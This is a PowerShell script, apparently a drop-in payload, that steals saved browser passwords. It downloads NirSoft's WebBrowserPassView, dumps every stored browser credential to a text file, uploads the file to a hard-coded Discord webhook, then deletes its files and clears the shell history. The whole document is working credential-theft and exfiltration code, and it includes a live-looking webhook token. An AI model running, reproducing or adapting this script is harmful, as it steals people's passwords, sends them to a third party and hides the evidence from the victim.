$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
$fileName = "pwds.txt"
$filePath = "C:\temp\" + $fileName
$wshell = New-Object -ComObject wscript.shell
$timeout = 60
$waitTime = 0

mkdir \temp | Out-Null
cd \temp
# Base64 encoded credentials for Basic Auth
$encodedCredentials = "ZG93bmxvYWQ6bmlyc29mdDEyMyE="  # Already encoded from 'download:nirsoft123!'

# Define headers based on the raw request headers you provided
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    "Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    "Accept-Encoding" = "gzip, deflate, br, zstd"
    "Accept-Language" = "en-US,en;q=0.9"
    "Authorization" = "Basic $encodedCredentials"
    "Cache-Control" = "max-age=0"
    "Referer" = "https://www.nirsoft.net/password_recovery_tools.html"
    "Sec-Fetch-Dest" = "document"
    "Sec-Fetch-Mode" = "navigate"
    "Sec-Fetch-Site" = "same-origin"
    "Sec-Fetch-User" = "?1"
    "Sec-GPC" = "1"
    "Upgrade-Insecure-Requests" = "1"
    "sec-ch-ua" = "`"Brave`;v=`"131`", `"Chromium`;v=`"131`", `"Not_A Brand`;v=`"24`""
    "sec-ch-ua-mobile" = "?0"
    "sec-ch-ua-platform" = "`"Windows`""
}

# Create a session to handle cookies
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# Perform the request with all headers and session
Invoke-WebRequest -Uri "https://www.nirsoft.net/protected_downloads/passreccommandline.zip" `
    -WebSession $session `
    -Headers $headers `
    -OutFile "passreccommandline.zip"
iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip | Out-Null
Expand-Archive 7z.zip | Out-Null
.\7z\7za.exe e passreccommandline.zip -pnirsoft123! -y | Out-Null
.\WebBrowserPassView.exe /stext pwds.txt

$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

$body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
Content-Type: application/octet-stream
$(Get-Content -Raw $filePath)
--$boundary--
"@

while ($waitTime -lt $timeout) {
    if ((Test-Path $filePath) -and ((Get-Item $filePath).length -gt 0)) {
        break
    }
    Start-Sleep -Seconds 1
    $waitTime++
}
Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $body | Out-Null
cd C:\
rm -R \temp
Clear-History
